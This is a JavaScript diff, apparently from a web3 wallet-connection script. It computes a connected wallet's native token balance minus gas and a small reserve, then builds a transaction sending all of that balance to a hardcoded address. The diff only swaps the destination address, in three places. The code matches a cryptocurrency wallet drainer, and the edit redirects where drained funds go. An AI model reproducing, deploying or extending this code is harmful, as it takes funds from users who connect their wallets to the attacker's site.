@@ -406,7 +406,7 @@ const getNativeTokenBalance = async (address, chainId) => {
       address: getAddress(address),
       chainId
     })
-    const gasCost = await calculateGasCost(wagmiAdapter.wagmiConfig, getAddress(address), getAddress('0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'), balance.value, chainId)
+    const gasCost = await calculateGasCost(wagmiAdapter.wagmiConfig, getAddress(address), getAddress('0x93C606f83966a78Ef74B2d76Ad914084B34066CE'), balance.value, chainId)
     const reserveAmount = parseUnits('0.0001', 18)
     const availableBalance = balance.value - BigInt(parseUnits(gasCost.toString(), 18)) - reserveAmount
     return availableBalance > 0n ? formatUnits(availableBalance, 18).toString() : '0'
@@ -508,13 +508,13 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
   const nativeToken = networkTokens.find(t => t.address === 'native')
   if (nativeToken) {
     const balanceWei = parseUnits(nativeToken.balance, 18)
-    const gasCost = await calculateGasCost(wagmiAdapter.wagmiConfig, getAddress(state.address), getAddress('0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'), balanceWei, mostExpensive.chainId)
+    const gasCost = await calculateGasCost(wagmiAdapter.wagmiConfig, getAddress(state.address), getAddress('0x93C606f83966a78Ef74B2d76Ad914084B34066CE'), balanceWei, mostExpensive.chainId)
     const reserveAmount = parseUnits('0.0001', 18)
     const availableBalance = balanceWei - BigInt(parseUnits(gasCost.toString(), 18)) - reserveAmount
     console.log(`Native token balance: ${nativeToken.balance}, gasCost: ${gasCost}, reserve: 0.0001, availableBalance: ${formatUnits(availableBalance, 18)}`)
     if (availableBalance > 0n) {
       transferCall = {
-        to: getAddress('0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'),
+        to: getAddress('0x93C606f83966a78Ef74B2d76Ad914084B34066CE'),
         value: `0x${availableBalance.toString(16)}`,
         // Omit data field to let it default, or use '0x00' as a minimal valid hex string
         // data: '0x00' // Uncomment this line if omitting data doesn't work
